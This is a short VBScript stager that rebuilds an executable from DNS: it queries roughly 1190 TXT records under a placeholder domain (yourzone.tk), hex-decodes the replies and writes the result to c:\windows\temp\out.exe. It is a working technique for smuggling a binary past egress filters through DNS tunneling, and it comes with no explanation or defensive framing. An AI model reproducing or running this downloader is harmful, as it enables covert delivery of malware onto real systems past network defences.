On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set writer = CreateObject("Scripting.FileSystemObject").createtextfile("c:\windows\temp\out.exe")
For d = 1 To 1190
 pos = 0
 While pos = 0 
  Set exec = objShell.Exec("nslookup -type=txt d"&d&".txt.yourzone.tk")
  res = exec.Stdout.ReadAll()
  pos = inStr(1,res,"?")
  txt = Mid(res,pos+1,253)
  Wscript.Echo d & " " & txt
 Wend
 For b = 0 To Len(txt)/2-1
   writer.Write Chr(CInt("&H" & Mid(txt,1+b*2,2)))
 Next
Next

Wscript.Echo "done"